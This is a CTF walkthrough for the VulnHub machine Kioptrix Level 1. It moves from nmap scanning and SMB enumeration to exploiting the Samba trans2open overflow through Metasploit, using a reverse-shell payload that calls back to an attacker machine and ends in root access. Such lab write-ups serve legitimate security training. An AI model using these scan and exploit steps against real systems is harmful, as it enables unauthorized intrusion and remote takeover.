---
title: "Kioptrix Level 1"
tagline: "Boot to root via a Samba trans2open buffer overflow, exploited through Metasploit."
category: CTF
difficulty: Intermediate
platform: VulnHub
date: 2026-01-05
---

## 📋 Overview
This guide documents the complete penetration testing methodology for Kioptrix Level 1, detailing every step from initial reconnaissance to privilege escalation and root access. *(There's no literal "flag" file on this machine — the goal is simply to become root.)*

## 🎯 Objectives
- Identify the target system and open services
- Enumerate users and services
- Exploit vulnerabilities to gain initial access
- Escalate privileges to obtain root access

## 1. Reconnaissance

```bash
$ ifconfig
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/IFCONFIG.PNG" alt="ifconfig output"></p>

```bash
$ nmap -sn 192.168.56.1/24
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/Hostdiscovery.PNG" alt="Nmap host discovery"></p>

```bash
$ nmap -p- -A 192.168.56.110
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/nmap.PNG" alt="Nmap port scan results"></p>

**Findings:**

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP |
| 111 | RPC |
| 139 | SMB |
| 443 | HTTPS |
| 32768 | RPC |

## 2. Enumeration

Port 80 shows a test page with nothing meaningful; port 443 returns a bad request.

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/http80.PNG" alt="Port 80 test page"></p>
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/http443.PNG" alt="Port 443 bad request"></p>

### SMB Enumeration
`enum4linux` doesn't return the SMB version, so pivot to Metasploit:

```bash
msf > search smb version detection
msf > use 0
msf > set RHOST 192.168.56.110
msf > run
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/Msf1.PNG" alt="Metasploit SMB version detection"></p>

SMB version: **Samba 2.2.1a**.

```bash
$ searchsploit samba 2.2
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/searchsploit.PNG" alt="searchsploit results"></p>

This turns up the **trans2open overflow** exploit.

## 3. Exploitation & Privilege Escalation

```bash
msf > search trans2open
```
Select the **Linux** variant, since the target runs Red Hat Linux.

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/Msf2.PNG" alt="trans2open module search"></p>

```bash
msf > use 1
msf > set RHOST 192.168.56.110
msf > set LHOST 192.168.56.15
msf > set payload generic/reverse_shell_tcp
msf > run
```

| Setting | Value | Notes |
|---------|-------|-------|
| `RHOST` | `192.168.56.110` | Kioptrix Level 1 target |
| `LHOST` | `192.168.56.15` | Attacker machine (Kali) |
| `payload` | `generic/reverse_shell_tcp` | Fits smaller memory buffers than the default |

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/Msf3.PNG" alt="Successful exploitation via trans2open"></p>

```bash
$ whoami
root
```

🎉 **Root access achieved!**

> There are other paths to root on this box too, including the classic `Open2Fuckv2.c` exploit.

## 🔧 Tools Used
`ifconfig` · `nmap` · Metasploit Framework · `searchsploit` · `bash` · `sudo`
